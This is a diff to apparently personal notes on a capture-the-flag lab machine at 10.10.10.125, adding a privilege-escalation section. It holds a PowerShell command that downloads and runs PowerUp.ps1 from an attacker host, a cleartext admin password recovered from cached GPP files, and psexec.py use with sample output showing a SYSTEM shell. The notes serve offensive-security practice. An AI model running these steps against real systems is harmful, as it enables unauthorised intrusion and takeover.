@@ -1,4 +1,6 @@
-SMB + XLSM Decode + MSSQL + Responder Attack + NTLM Hash + Powershell reverse shell
+SMB + XLSM Decode + MSSQL + LLMNR Responder Attack + NTLM Hash + Powershell reverse shell
+
+Use of psexec.py to open a service and get a shell with Admin credds
 
 1-Enumeration:
     nmap -T5 -Pn -sC -sV 10.10.10.125 -oN enum/scanLogs1.logs  -vv
@@ -190,6 +192,35 @@ SMB + XLSM Decode + MSSQL + Responder Attack + NTLM Hash + Powershell reverse sh
 
             systeminfo
                 windows server 2019 == Potatoe Patched...............    
+        
+    Enumeration for Admin:
+        We will Download PowerUp.ps1 via powershell script:
+            IEX(New-Object Net.WebClient).DownloadString("http://<Kali IP: Port>/PowerUp.ps1")
+
+        We use a fonction provided via PowerUp:
+            Invoke-AllChecks
+
+            In "Cached GPP Files"
+
+                We find "Admin creds" in clear
+
+
+    Exploit Admin Account via services:
+        Now to get a shell with Admin creds we will use Impacket - psexec.py to create and run a service:
+            psexec.py 'administrator:<Password>'@remoteIp
+
+            real syntax (in my Kali):
+                /usr/share/doc/python3-impacket/examples/psexec.py '<User>:<Password>'@10.10.10.125
+                [*] Process cmd.exe finished with ErrorCode: 0, ReturnCode: 9009
+                [*] Opening SVCManager on 10.10.10.125.....
+                [*] Stopping service jLLj.....
+                [*] Removing service jLLj.....
+                [*] Removing file KsXvyJeW.exe.....
+
+
+                C:\Windows\system32> whoami
+                    nt authority\system
+
 
 
 
